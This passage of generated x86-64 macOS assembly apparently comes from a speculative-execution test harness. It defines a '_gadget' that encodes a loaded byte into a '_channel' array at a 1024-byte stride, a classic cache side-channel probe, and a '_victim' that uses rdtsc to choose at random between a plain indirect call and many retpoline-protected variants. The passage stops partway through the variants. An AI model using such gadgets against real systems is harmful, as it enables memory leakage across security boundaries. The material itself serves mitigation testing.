	.section	__TEXT,__text,regular,pure_instructions
	.build_version macos, 15, 0	sdk_version 26, 1
	.globl	_gadget                         ## -- Begin function gadget
	.p2align	4, 0x90
_gadget:
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	movq	%rdi, -8(%rbp)
	movq	-8(%rbp), %rax
	movsbl	(%rax), %eax
	shll	$10, %eax
	movslq	%eax, %rcx
	movq	_channel@GOTPCREL(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	popq	%rbp
	retq
	.cfi_endproc
                                        ## -- End function
	.globl	_safe_target                    ## -- Begin function safe_target
	.p2align	4, 0x90
_safe_target:
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	movl	$42, %eax
	popq	%rbp
	retq
	.cfi_endproc
                                        ## -- End function
	.globl	_victim                         ## -- Begin function victim
	.p2align	4, 0x90
_victim:
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	pushq	%rbx
	.cfi_offset %rbx, -24
	movq	%rdi, -16(%rbp)
	movl	%esi, -20(%rbp)
	movl	$0, -24(%rbp)
	movl	$1, -28(%rbp)
LBB2_1:                                 ## =>This Inner Loop Header: Depth=1
	cmpl	$100, -28(%rbp)
	jg	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	-20(%rbp), %eax
	movl	%eax, -20(%rbp)
	movl	-20(%rbp), %eax
	andl	-28(%rbp), %eax
	addl	-24(%rbp), %eax
	movl	%eax, -24(%rbp)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-28(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -28(%rbp)
	jmp	LBB2_1
LBB2_4:
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$250, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lvictim_win0_var0
	cmpl	$1, %eax
	je	.Lvictim_win0_var1
	cmpl	$2, %eax
	je	.Lvictim_win0_var2
	cmpl	$3, %eax
	je	.Lvictim_win0_var3
	cmpl	$4, %eax
	je	.Lvictim_win0_var4
	cmpl	$5, %eax
	je	.Lvictim_win0_var5
	cmpl	$6, %eax
	je	.Lvictim_win0_var6
	cmpl	$7, %eax
	je	.Lvictim_win0_var7
	cmpl	$8, %eax
	je	.Lvictim_win0_var8
	cmpl	$9, %eax
	je	.Lvictim_win0_var9
	cmpl	$10, %eax
	je	.Lvictim_win0_var10
	cmpl	$11, %eax
	je	.Lvictim_win0_var11
	cmpl	$12, %eax
	je	.Lvictim_win0_var12
	cmpl	$13, %eax
	je	.Lvictim_win0_var13
	cmpl	$14, %eax
	je	.Lvictim_win0_var14
	cmpl	$15, %eax
	je	.Lvictim_win0_var15
	cmpl	$16, %eax
	je	.Lvictim_win0_var16
	cmpl	$17, %eax
	je	.Lvictim_win0_var17
	cmpl	$18, %eax
	je	.Lvictim_win0_var18
	cmpl	$19, %eax
	je	.Lvictim_win0_var19
	cmpl	$20, %eax
	je	.Lvictim_win0_var20
	cmpl	$21, %eax
	je	.Lvictim_win0_var21
	cmpl	$22, %eax
	je	.Lvictim_win0_var22
	cmpl	$23, %eax
	je	.Lvictim_win0_var23
	cmpl	$24, %eax
	je	.Lvictim_win0_var24
	cmpl	$25, %eax
	je	.Lvictim_win0_var25
	cmpl	$26, %eax
	je	.Lvictim_win0_var26
	cmpl	$27, %eax
	je	.Lvictim_win0_var27
	cmpl	$28, %eax
	je	.Lvictim_win0_var28
	cmpl	$29, %eax
	je	.Lvictim_win0_var29
	cmpl	$30, %eax
	je	.Lvictim_win0_var30
	cmpl	$31, %eax
	je	.Lvictim_win0_var31
	cmpl	$32, %eax
	je	.Lvictim_win0_var32
	cmpl	$33, %eax
	je	.Lvictim_win0_var33
	cmpl	$34, %eax
	je	.Lvictim_win0_var34
	cmpl	$35, %eax
	je	.Lvictim_win0_var35
	cmpl	$36, %eax
	je	.Lvictim_win0_var36
	cmpl	$37, %eax
	je	.Lvictim_win0_var37
	cmpl	$38, %eax
	je	.Lvictim_win0_var38
	cmpl	$39, %eax
	je	.Lvictim_win0_var39
	cmpl	$40, %eax
	je	.Lvictim_win0_var40
	cmpl	$41, %eax
	je	.Lvictim_win0_var41
	cmpl	$42, %eax
	je	.Lvictim_win0_var42
	cmpl	$43, %eax
	je	.Lvictim_win0_var43
	cmpl	$44, %eax
	je	.Lvictim_win0_var44
	cmpl	$45, %eax
	je	.Lvictim_win0_var45
	cmpl	$46, %eax
	je	.Lvictim_win0_var46
	cmpl	$47, %eax
	je	.Lvictim_win0_var47
	cmpl	$48, %eax
	je	.Lvictim_win0_var48
	cmpl	$49, %eax
	je	.Lvictim_win0_var49
	cmpl	$50, %eax
	je	.Lvictim_win0_var50
	cmpl	$51, %eax
	je	.Lvictim_win0_var51
	cmpl	$52, %eax
	je	.Lvictim_win0_var52
	cmpl	$53, %eax
	je	.Lvictim_win0_var53
	cmpl	$54, %eax
	je	.Lvictim_win0_var54
	cmpl	$55, %eax
	je	.Lvictim_win0_var55
	cmpl	$56, %eax
	je	.Lvictim_win0_var56
	cmpl	$57, %eax
	je	.Lvictim_win0_var57
	cmpl	$58, %eax
	je	.Lvictim_win0_var58
	cmpl	$59, %eax
	je	.Lvictim_win0_var59
	cmpl	$60, %eax
	je	.Lvictim_win0_var60
	cmpl	$61, %eax
	je	.Lvictim_win0_var61
	cmpl	$62, %eax
	je	.Lvictim_win0_var62
	cmpl	$63, %eax
	je	.Lvictim_win0_var63
	cmpl	$64, %eax
	je	.Lvictim_win0_var64
	cmpl	$65, %eax
	je	.Lvictim_win0_var65
	cmpl	$66, %eax
	je	.Lvictim_win0_var66
	cmpl	$67, %eax
	je	.Lvictim_win0_var67
	cmpl	$68, %eax
	je	.Lvictim_win0_var68
	cmpl	$69, %eax
	je	.Lvictim_win0_var69
	cmpl	$70, %eax
	je	.Lvictim_win0_var70
	cmpl	$71, %eax
	je	.Lvictim_win0_var71
	cmpl	$72, %eax
	je	.Lvictim_win0_var72
	cmpl	$73, %eax
	je	.Lvictim_win0_var73
	cmpl	$74, %eax
	je	.Lvictim_win0_var74
	cmpl	$75, %eax
	je	.Lvictim_win0_var75
	cmpl	$76, %eax
	je	.Lvictim_win0_var76
	cmpl	$77, %eax
	je	.Lvictim_win0_var77
	cmpl	$78, %eax
	je	.Lvictim_win0_var78
	cmpl	$79, %eax
	je	.Lvictim_win0_var79
	cmpl	$80, %eax
	je	.Lvictim_win0_var80
	cmpl	$81, %eax
	je	.Lvictim_win0_var81
	cmpl	$82, %eax
	je	.Lvictim_win0_var82
	cmpl	$83, %eax
	je	.Lvictim_win0_var83
	cmpl	$84, %eax
	je	.Lvictim_win0_var84
	cmpl	$85, %eax
	je	.Lvictim_win0_var85
	cmpl	$86, %eax
	je	.Lvictim_win0_var86
	cmpl	$87, %eax
	je	.Lvictim_win0_var87
	cmpl	$88, %eax
	je	.Lvictim_win0_var88
	cmpl	$89, %eax
	je	.Lvictim_win0_var89
	cmpl	$90, %eax
	je	.Lvictim_win0_var90
	cmpl	$91, %eax
	je	.Lvictim_win0_var91
	cmpl	$92, %eax
	je	.Lvictim_win0_var92
	cmpl	$93, %eax
	je	.Lvictim_win0_var93
	cmpl	$94, %eax
	je	.Lvictim_win0_var94
	cmpl	$95, %eax
	je	.Lvictim_win0_var95
	cmpl	$96, %eax
	je	.Lvictim_win0_var96
	cmpl	$97, %eax
	je	.Lvictim_win0_var97
	cmpl	$98, %eax
	je	.Lvictim_win0_var98
	cmpl	$99, %eax
	je	.Lvictim_win0_var99
	cmpl	$100, %eax
	je	.Lvictim_win0_var100
	cmpl	$101, %eax
	je	.Lvictim_win0_var101
	cmpl	$102, %eax
	je	.Lvictim_win0_var102
	cmpl	$103, %eax
	je	.Lvictim_win0_var103
	cmpl	$104, %eax
	je	.Lvictim_win0_var104
	cmpl	$105, %eax
	je	.Lvictim_win0_var105
	cmpl	$106, %eax
	je	.Lvictim_win0_var106
	cmpl	$107, %eax
	je	.Lvictim_win0_var107
	cmpl	$108, %eax
	je	.Lvictim_win0_var108
	cmpl	$109, %eax
	je	.Lvictim_win0_var109
	cmpl	$110, %eax
	je	.Lvictim_win0_var110
	cmpl	$111, %eax
	je	.Lvictim_win0_var111
	cmpl	$112, %eax
	je	.Lvictim_win0_var112
	cmpl	$113, %eax
	je	.Lvictim_win0_var113
	cmpl	$114, %eax
	je	.Lvictim_win0_var114
	cmpl	$115, %eax
	je	.Lvictim_win0_var115
	cmpl	$116, %eax
	je	.Lvictim_win0_var116
	cmpl	$117, %eax
	je	.Lvictim_win0_var117
	cmpl	$118, %eax
	je	.Lvictim_win0_var118
	cmpl	$119, %eax
	je	.Lvictim_win0_var119
	cmpl	$120, %eax
	je	.Lvictim_win0_var120
	cmpl	$121, %eax
	je	.Lvictim_win0_var121
	cmpl	$122, %eax
	je	.Lvictim_win0_var122
	cmpl	$123, %eax
	je	.Lvictim_win0_var123
	cmpl	$124, %eax
	je	.Lvictim_win0_var124
	cmpl	$125, %eax
	je	.Lvictim_win0_var125
	cmpl	$126, %eax
	je	.Lvictim_win0_var126
	cmpl	$127, %eax
	je	.Lvictim_win0_var127
	cmpl	$128, %eax
	je	.Lvictim_win0_var128
	cmpl	$129, %eax
	je	.Lvictim_win0_var129
	cmpl	$130, %eax
	je	.Lvictim_win0_var130
	cmpl	$131, %eax
	je	.Lvictim_win0_var131
	cmpl	$132, %eax
	je	.Lvictim_win0_var132
	cmpl	$133, %eax
	je	.Lvictim_win0_var133
	cmpl	$134, %eax
	je	.Lvictim_win0_var134
	cmpl	$135, %eax
	je	.Lvictim_win0_var135
	cmpl	$136, %eax
	je	.Lvictim_win0_var136
	cmpl	$137, %eax
	je	.Lvictim_win0_var137
	cmpl	$138, %eax
	je	.Lvictim_win0_var138
	cmpl	$139, %eax
	je	.Lvictim_win0_var139
	cmpl	$140, %eax
	je	.Lvictim_win0_var140
	cmpl	$141, %eax
	je	.Lvictim_win0_var141
	cmpl	$142, %eax
	je	.Lvictim_win0_var142
	cmpl	$143, %eax
	je	.Lvictim_win0_var143
	cmpl	$144, %eax
	je	.Lvictim_win0_var144
	cmpl	$145, %eax
	je	.Lvictim_win0_var145
	cmpl	$146, %eax
	je	.Lvictim_win0_var146
	cmpl	$147, %eax
	je	.Lvictim_win0_var147
	cmpl	$148, %eax
	je	.Lvictim_win0_var148
	cmpl	$149, %eax
	je	.Lvictim_win0_var149
	cmpl	$150, %eax
	je	.Lvictim_win0_var150
	cmpl	$151, %eax
	je	.Lvictim_win0_var151
	cmpl	$152, %eax
	je	.Lvictim_win0_var152
	cmpl	$153, %eax
	je	.Lvictim_win0_var153
	cmpl	$154, %eax
	je	.Lvictim_win0_var154
	cmpl	$155, %eax
	je	.Lvictim_win0_var155
	cmpl	$156, %eax
	je	.Lvictim_win0_var156
	cmpl	$157, %eax
	je	.Lvictim_win0_var157
	cmpl	$158, %eax
	je	.Lvictim_win0_var158
	cmpl	$159, %eax
	je	.Lvictim_win0_var159
	cmpl	$160, %eax
	je	.Lvictim_win0_var160
	cmpl	$161, %eax
	je	.Lvictim_win0_var161
	cmpl	$162, %eax
	je	.Lvictim_win0_var162
	cmpl	$163, %eax
	je	.Lvictim_win0_var163
	cmpl	$164, %eax
	je	.Lvictim_win0_var164
	cmpl	$165, %eax
	je	.Lvictim_win0_var165
	cmpl	$166, %eax
	je	.Lvictim_win0_var166
	cmpl	$167, %eax
	je	.Lvictim_win0_var167
	cmpl	$168, %eax
	je	.Lvictim_win0_var168
	cmpl	$169, %eax
	je	.Lvictim_win0_var169
	cmpl	$170, %eax
	je	.Lvictim_win0_var170
	cmpl	$171, %eax
	je	.Lvictim_win0_var171
	cmpl	$172, %eax
	je	.Lvictim_win0_var172
	cmpl	$173, %eax
	je	.Lvictim_win0_var173
	cmpl	$174, %eax
	je	.Lvictim_win0_var174
	cmpl	$175, %eax
	je	.Lvictim_win0_var175
	cmpl	$176, %eax
	je	.Lvictim_win0_var176
	cmpl	$177, %eax
	je	.Lvictim_win0_var177
	cmpl	$178, %eax
	je	.Lvictim_win0_var178
	cmpl	$179, %eax
	je	.Lvictim_win0_var179
	cmpl	$180, %eax
	je	.Lvictim_win0_var180
	cmpl	$181, %eax
	je	.Lvictim_win0_var181
	cmpl	$182, %eax
	je	.Lvictim_win0_var182
	cmpl	$183, %eax
	je	.Lvictim_win0_var183
	cmpl	$184, %eax
	je	.Lvictim_win0_var184
	cmpl	$185, %eax
	je	.Lvictim_win0_var185
	cmpl	$186, %eax
	je	.Lvictim_win0_var186
	cmpl	$187, %eax
	je	.Lvictim_win0_var187
	cmpl	$188, %eax
	je	.Lvictim_win0_var188
	cmpl	$189, %eax
	je	.Lvictim_win0_var189
	cmpl	$190, %eax
	je	.Lvictim_win0_var190
	cmpl	$191, %eax
	je	.Lvictim_win0_var191
	cmpl	$192, %eax
	je	.Lvictim_win0_var192
	cmpl	$193, %eax
	je	.Lvictim_win0_var193
	cmpl	$194, %eax
	je	.Lvictim_win0_var194
	cmpl	$195, %eax
	je	.Lvictim_win0_var195
	cmpl	$196, %eax
	je	.Lvictim_win0_var196
	cmpl	$197, %eax
	je	.Lvictim_win0_var197
	cmpl	$198, %eax
	je	.Lvictim_win0_var198
	cmpl	$199, %eax
	je	.Lvictim_win0_var199
	cmpl	$200, %eax
	je	.Lvictim_win0_var200
	cmpl	$201, %eax
	je	.Lvictim_win0_var201
	cmpl	$202, %eax
	je	.Lvictim_win0_var202
	cmpl	$203, %eax
	je	.Lvictim_win0_var203
	cmpl	$204, %eax
	je	.Lvictim_win0_var204
	cmpl	$205, %eax
	je	.Lvictim_win0_var205
	cmpl	$206, %eax
	je	.Lvictim_win0_var206
	cmpl	$207, %eax
	je	.Lvictim_win0_var207
	cmpl	$208, %eax
	je	.Lvictim_win0_var208
	cmpl	$209, %eax
	je	.Lvictim_win0_var209
	cmpl	$210, %eax
	je	.Lvictim_win0_var210
	cmpl	$211, %eax
	je	.Lvictim_win0_var211
	cmpl	$212, %eax
	je	.Lvictim_win0_var212
	cmpl	$213, %eax
	je	.Lvictim_win0_var213
	cmpl	$214, %eax
	je	.Lvictim_win0_var214
	cmpl	$215, %eax
	je	.Lvictim_win0_var215
	cmpl	$216, %eax
	je	.Lvictim_win0_var216
	cmpl	$217, %eax
	je	.Lvictim_win0_var217
	cmpl	$218, %eax
	je	.Lvictim_win0_var218
	cmpl	$219, %eax
	je	.Lvictim_win0_var219
	cmpl	$220, %eax
	je	.Lvictim_win0_var220
	cmpl	$221, %eax
	je	.Lvictim_win0_var221
	cmpl	$222, %eax
	je	.Lvictim_win0_var222
	cmpl	$223, %eax
	je	.Lvictim_win0_var223
	cmpl	$224, %eax
	je	.Lvictim_win0_var224
	cmpl	$225, %eax
	je	.Lvictim_win0_var225
	cmpl	$226, %eax
	je	.Lvictim_win0_var226
	cmpl	$227, %eax
	je	.Lvictim_win0_var227
	cmpl	$228, %eax
	je	.Lvictim_win0_var228
	cmpl	$229, %eax
	je	.Lvictim_win0_var229
	cmpl	$230, %eax
	je	.Lvictim_win0_var230
	cmpl	$231, %eax
	je	.Lvictim_win0_var231
	cmpl	$232, %eax
	je	.Lvictim_win0_var232
	cmpl	$233, %eax
	je	.Lvictim_win0_var233
	cmpl	$234, %eax
	je	.Lvictim_win0_var234
	cmpl	$235, %eax
	je	.Lvictim_win0_var235
	cmpl	$236, %eax
	je	.Lvictim_win0_var236
	cmpl	$237, %eax
	je	.Lvictim_win0_var237
	cmpl	$238, %eax
	je	.Lvictim_win0_var238
	cmpl	$239, %eax
	je	.Lvictim_win0_var239
	cmpl	$240, %eax
	je	.Lvictim_win0_var240
	cmpl	$241, %eax
	je	.Lvictim_win0_var241
	cmpl	$242, %eax
	je	.Lvictim_win0_var242
	cmpl	$243, %eax
	je	.Lvictim_win0_var243
	cmpl	$244, %eax
	je	.Lvictim_win0_var244
	cmpl	$245, %eax
	je	.Lvictim_win0_var245
	cmpl	$246, %eax
	je	.Lvictim_win0_var246
	cmpl	$247, %eax
	je	.Lvictim_win0_var247
	cmpl	$248, %eax
	je	.Lvictim_win0_var248
	cmpl	$249, %eax
	je	.Lvictim_win0_var249
	jmp	.Lvictim_win0_var0
## Variant 0
.Lvictim_win0_var0:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	*%rbx
	jmp	.Lvictim_win0_continue
## Variant 1
.Lvictim_win0_var1:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000001
	jmp	.Lgg_retpol_after_000001
.Lgg_retpol_thunk_000001:
	callq	.Lgg_retpol_setup_000001
.Lgg_retpol_cap_000001:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000001
.Lgg_retpol_setup_000001:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000001:
	jmp	.Lvictim_win0_continue
## Variant 2
.Lvictim_win0_var2:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000002
	jmp	.Lgg_retpol_after_000002
.Lgg_retpol_thunk_000002:
	callq	.Lgg_retpol_setup_000002
.Lgg_retpol_cap_000002:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000002
.Lgg_retpol_setup_000002:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000002:
	jmp	.Lvictim_win0_continue
## Variant 3
.Lvictim_win0_var3:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000003
	jmp	.Lgg_retpol_after_000003
.Lgg_retpol_thunk_000003:
	callq	.Lgg_retpol_setup_000003
.Lgg_retpol_cap_000003:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000003
.Lgg_retpol_setup_000003:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000003:
	jmp	.Lvictim_win0_continue
## Variant 4
.Lvictim_win0_var4:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000004
	jmp	.Lgg_retpol_after_000004
.Lgg_retpol_thunk_000004:
	callq	.Lgg_retpol_setup_000004
.Lgg_retpol_cap_000004:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000004
.Lgg_retpol_setup_000004:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000004:
	jmp	.Lvictim_win0_continue
## Variant 5
.Lvictim_win0_var5:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000005
	jmp	.Lgg_retpol_after_000005
.Lgg_retpol_thunk_000005:
	callq	.Lgg_retpol_setup_000005
.Lgg_retpol_cap_000005:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000005
.Lgg_retpol_setup_000005:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000005:
	jmp	.Lvictim_win0_continue
## Variant 6
.Lvictim_win0_var6:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000006
	jmp	.Lgg_retpol_after_000006
.Lgg_retpol_thunk_000006:
	callq	.Lgg_retpol_setup_000006
.Lgg_retpol_cap_000006:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000006
.Lgg_retpol_setup_000006:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000006:
	jmp	.Lvictim_win0_continue
## Variant 7
.Lvictim_win0_var7:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000007
	jmp	.Lgg_retpol_after_000007
.Lgg_retpol_thunk_000007:
	callq	.Lgg_retpol_setup_000007
.Lgg_retpol_cap_000007:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000007
.Lgg_retpol_setup_000007:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000007:
	jmp	.Lvictim_win0_continue
## Variant 8
.Lvictim_win0_var8:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000008
	jmp	.Lgg_retpol_after_000008
.Lgg_retpol_thunk_000008:
	callq	.Lgg_retpol_setup_000008
.Lgg_retpol_cap_000008:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000008
.Lgg_retpol_setup_000008:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000008:
	jmp	.Lvictim_win0_continue
## Variant 9
.Lvictim_win0_var9:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000009
	jmp	.Lgg_retpol_after_000009
.Lgg_retpol_thunk_000009:
	callq	.Lgg_retpol_setup_000009
.Lgg_retpol_cap_000009:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000009
.Lgg_retpol_setup_000009:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000009:
	jmp	.Lvictim_win0_continue
## Variant 10
.Lvictim_win0_var10:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000010
	jmp	.Lgg_retpol_after_000010
.Lgg_retpol_thunk_000010:
	callq	.Lgg_retpol_setup_000010
.Lgg_retpol_cap_000010:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000010
.Lgg_retpol_setup_000010:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000010:
	jmp	.Lvictim_win0_continue
## Variant 11
.Lvictim_win0_var11:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000011
	jmp	.Lgg_retpol_after_000011
.Lgg_retpol_thunk_000011:
	callq	.Lgg_retpol_setup_000011
.Lgg_retpol_cap_000011:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000011
.Lgg_retpol_setup_000011:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000011:
	jmp	.Lvictim_win0_continue
## Variant 12
.Lvictim_win0_var12:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000012
	jmp	.Lgg_retpol_after_000012
.Lgg_retpol_thunk_000012:
	callq	.Lgg_retpol_setup_000012
.Lgg_retpol_cap_000012:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000012
.Lgg_retpol_setup_000012:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000012:
	jmp	.Lvictim_win0_continue
## Variant 13
.Lvictim_win0_var13:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000013
	jmp	.Lgg_retpol_after_000013
.Lgg_retpol_thunk_000013:
	callq	.Lgg_retpol_setup_000013
.Lgg_retpol_cap_000013:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000013
.Lgg_retpol_setup_000013:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000013:
	jmp	.Lvictim_win0_continue
## Variant 14
.Lvictim_win0_var14:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000014
	jmp	.Lgg_retpol_after_000014
.Lgg_retpol_thunk_000014:
	callq	.Lgg_retpol_setup_000014
.Lgg_retpol_cap_000014:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000014
.Lgg_retpol_setup_000014:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000014:
	jmp	.Lvictim_win0_continue
## Variant 15
.Lvictim_win0_var15:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000015
	jmp	.Lgg_retpol_after_000015
.Lgg_retpol_thunk_000015:
	callq	.Lgg_retpol_setup_000015
.Lgg_retpol_cap_000015:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000015
.Lgg_retpol_setup_000015:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000015:
	jmp	.Lvictim_win0_continue
## Variant 16
.Lvictim_win0_var16:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000016
	jmp	.Lgg_retpol_after_000016
.Lgg_retpol_thunk_000016:
	callq	.Lgg_retpol_setup_000016
.Lgg_retpol_cap_000016:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000016
.Lgg_retpol_setup_000016:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000016:
	jmp	.Lvictim_win0_continue
## Variant 17
.Lvictim_win0_var17:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000017
	jmp	.Lgg_retpol_after_000017
.Lgg_retpol_thunk_000017:
	callq	.Lgg_retpol_setup_000017
.Lgg_retpol_cap_000017:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000017
.Lgg_retpol_setup_000017:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000017:
	jmp	.Lvictim_win0_continue
## Variant 18
.Lvictim_win0_var18:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000018
	jmp	.Lgg_retpol_after_000018
.Lgg_retpol_thunk_000018:
	callq	.Lgg_retpol_setup_000018
.Lgg_retpol_cap_000018:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000018
.Lgg_retpol_setup_000018:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000018:
	jmp	.Lvictim_win0_continue
## Variant 19
.Lvictim_win0_var19:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000019
	jmp	.Lgg_retpol_after_000019
.Lgg_retpol_thunk_000019:
	callq	.Lgg_retpol_setup_000019
.Lgg_retpol_cap_000019:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000019
.Lgg_retpol_setup_000019:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000019:
	jmp	.Lvictim_win0_continue
## Variant 20
.Lvictim_win0_var20:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000020
	jmp	.Lgg_retpol_after_000020
.Lgg_retpol_thunk_000020:
	callq	.Lgg_retpol_setup_000020
.Lgg_retpol_cap_000020:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000020
.Lgg_retpol_setup_000020:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000020:
	jmp	.Lvictim_win0_continue
## Variant 21
.Lvictim_win0_var21:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000021
	jmp	.Lgg_retpol_after_000021
.Lgg_retpol_thunk_000021:
	callq	.Lgg_retpol_setup_000021
.Lgg_retpol_cap_000021:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000021
.Lgg_retpol_setup_000021:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000021:
	jmp	.Lvictim_win0_continue
## Variant 22
.Lvictim_win0_var22:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000022
	jmp	.Lgg_retpol_after_000022
.Lgg_retpol_thunk_000022:
	callq	.Lgg_retpol_setup_000022
.Lgg_retpol_cap_000022:
	pause
	lfence
	jmp	.Lgg_retpol_cap_000022
.Lgg_retpol_setup_000022:
	movq	%rbx, (%rsp)
	ret
.Lgg_retpol_after_000022:
	jmp	.Lvictim_win0_continue
## Variant 23
.Lvictim_win0_var23:
	popq	%rax
	movq	_target@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	(%rax), %rbx
	## InlineAsm Start
	callq	.Lgg_retpol_thunk_000023
